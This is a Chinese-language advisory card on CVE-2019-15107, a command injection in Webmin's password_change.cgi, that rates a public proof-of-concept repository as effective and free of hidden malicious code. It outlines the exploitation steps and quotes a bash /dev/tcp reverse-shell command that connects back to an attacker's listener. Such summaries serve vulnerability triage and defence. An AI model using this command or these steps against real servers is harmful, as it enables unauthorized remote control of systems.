## CVE-2019-15107 - Webmin password_change.cgi 命令注入

**漏洞编号:** CVE-2019-15107

**漏洞类型:** 命令注入

**影响应用:** Webmin

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 1.920

**利用条件:** 需要Webmin服务运行在10000端口，且目标存在未授权访问漏洞或已授权的Webmin用户

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-15107漏洞存在于Webmin 1.920及更早版本的password_change.cgi文件中。攻击者可以通过向old参数发送特制的请求，注入操作系统命令。由于该漏洞允许未经身份验证的远程代码执行，因此风险极高。

**有效性评估：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，可以判断该漏洞利用的有效性较高。漏洞库和搜索引擎结果均表明该漏洞是真实存在的，并且存在公开可用的PoC代码。提供的Python脚本PoC也实现了漏洞验证和利用的功能，通过发送包含恶意命令的POST请求，尝试在目标系统上执行任意命令。

**投毒风险分析：**
检查提供的PoC代码，未发现明显的投毒代码。代码主要功能是：
1.  发送包含命令注入的HTTP请求。
2.  启动一个反向shell监听器。
3.  如果目标存在漏洞，利用命令注入执行反向shell，连接到攻击者的监听器。

代码中使用的反向shell命令`bash -c '0<&66-;exec 66<>/dev/tcp/{lhost}/{lport};sh <&66 >&66 2>&66'`是常见的反向shell命令，并没有发现恶意或隐藏的代码。因此，可以判断此仓库中不存在作者隐藏的投毒代码。

**利用方式：**
1.  **漏洞发现：** 攻击者扫描或探测运行Webmin的服务器，识别存在漏洞的版本（<=1.920）。
2.  **构造恶意请求：** 攻击者构造包含命令注入的POST请求，将恶意命令放入password_change.cgi文件的old参数中。
3.  **发送请求：** 攻击者将构造的POST请求发送到目标服务器的`/password_change.cgi`路径。
4.  **执行命令：** Webmin服务器在处理password_change.cgi请求时，由于未对old参数进行充分的验证和过滤，导致注入的命令被执行。
5.  **获取权限：** 攻击者通过执行恶意命令，例如反向shell，获取目标服务器的控制权限。

**项目地址:** [K3ysTr0K3R/CVE-2019-15107-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2019-15107-EXPLOIT)

**漏洞详情:** [CVE-2019-15107](https://nvd.nist.gov/vuln/detail/CVE-2019-15107)